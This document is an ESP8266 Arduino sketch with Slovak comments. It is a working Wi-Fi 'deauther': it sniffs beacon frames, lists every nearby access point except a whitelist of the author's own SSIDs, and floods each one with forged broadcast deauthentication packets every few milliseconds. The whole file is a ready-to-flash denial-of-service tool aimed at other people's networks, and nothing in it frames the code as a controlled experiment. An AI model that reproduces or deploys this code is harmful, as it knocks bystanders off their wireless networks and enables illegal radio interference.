#ifdef ESP8266
extern "C" {
#include "ets_sys.h"
#include "osapi.h"
#include "user_interface.h"
}
#endif

#include <Arduino.h>

// —————— WHITELIST (presné SSID) ——————
#define WHITELIST_ENABLED 1

const char* EXCLUDE_SSID[] = {
  "TP-Link_3997",
  //"TP-LINK_A2183C",
  "RasPi-Fi",
  "NUO_9E75",
  "TP-Link_3997_Ext"
  //"",  // Hidden networks -> EMPTY SSID
};
const int EXCLUDE_COUNT = sizeof(EXCLUDE_SSID) / sizeof(EXCLUDE_SSID[0]);

int shouldExclude(const char* ssid) {
  if (!WHITELIST_ENABLED) return 0;
  for (int i = 0; i < EXCLUDE_COUNT; i++) {
    if (strcmp(ssid, EXCLUDE_SSID[i]) == 0) return 1;
  }
  return 0;
}

// —————— AP ŠTRUKTÚRA (čisté C, žiadne Stringy) ——————
#define MAX_SSID_LEN 32
#define MAX_APS 30

struct AccessPoint {
  char essid[MAX_SSID_LEN + 1];
  uint8_t bssid[6];
  int channel;
  uint8_t deauthPacket[26];
};

struct AccessPoint aps[MAX_APS];
int current = -1;

// —————— SNIFFER CALLBACK ——————
void ICACHE_FLASH_ATTR promisc_cb(uint8_t *buf, uint16_t len) {
  if (len < 12 + 38) return;

  // Preskoč RxControl (12 bajtov)
  uint8_t *frame = buf + 12;

  // Beacon: type 0x80
  if (frame[0] != 0x80) return;

  uint8_t bssid[6];
  memcpy(bssid, frame + 10, 6);
  int ssid_len = frame[37];
  if (ssid_len > MAX_SSID_LEN) ssid_len = MAX_SSID_LEN;

  char essid[MAX_SSID_LEN + 1] = {0};
  for (int i = 0; i < ssid_len; i++) {
    char c = frame[38 + i];
    if (c >= 32 && c < 127) essid[i] = c;
  }
  essid[ssid_len] = 0;

  if (shouldExclude(essid)) return;

  // Skontroluj, či už existuje
  for (int i = 0; i <= current; i++) {
    if (memcmp(aps[i].bssid, bssid, 6) == 0) {
      return; // už máme
    }
  }

  // Pridaj novú
  if (current + 1 < MAX_APS) {
    current++;
    strncpy(aps[current].essid, essid, MAX_SSID_LEN);
    memcpy(aps[current].bssid, bssid, 6);
    aps[current].channel = *(buf + 8); // channel je v RxControl[8] (low 4 bity)

    // Postav deauth paket
    uint8_t pkt[26] = {
      0xC0, 0x00,                           // Deauth
      0x00, 0x00,                           // Duration
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // addr1: broadcast
      bssid[0], bssid[1], bssid[2],        // addr2: BSSID
      bssid[3], bssid[4], bssid[5],
      bssid[0], bssid[1], bssid[2],        // addr3: BSSID
      bssid[3], bssid[4], bssid[5],
      0x00, 0x00,                           // seq
      0x01, 0x00                            // reason
    };
    memcpy(aps[current].deauthPacket, pkt, 26);

    Serial.printf("[+] %s (CH%d)\n", essid, aps[current].channel);
  }
}

// —————— SCAN ——————
void scan() {
  Serial.println("[SCAN] Start...");

  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(promisc_cb);
  wifi_promiscuous_enable(1);

  const int channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
  const int num_ch = sizeof(channels) / sizeof(channels[0]);

  for (int round = 0; round < 2; round++) {
    for (int i = 0; i < num_ch; i++) {
      wifi_set_channel(channels[i]);
      delay(200);
    }
  }

  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(NULL);

  Serial.printf("[SCAN] Hotovo. AP: %d\n", current + 1);
}

// —————— DEAUTH (bez referencie!) ——————
void sendDeauth(int index) {
  if (index < 0 || index > current) return;
  wifi_set_channel(aps[index].channel);
  wifi_send_pkt_freedom(aps[index].deauthPacket, 26, 0);
}

// —————— SETUP ——————
void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n=== ESP8266 Deauther (Final, C-safe) ===");

  wifi_set_opmode(STATION_MODE);
  scan();
}

// —————— LOOP ——————
void loop() {
  static unsigned long last_scan = millis();
  const unsigned long SCAN_INTERVAL = 60000; // 60s

  if (millis() - last_scan > SCAN_INTERVAL) {
    scan();
    last_scan = millis();
  }

  // ~300 paketov/s (bezpečné)
  static unsigned long last_deauth = 0;
  if (millis() - last_deauth > 3) {
    for (int i = 0; i <= current; i++) {
      sendDeauth(i);
    }
    last_deauth = millis();
  }

  yield();
}
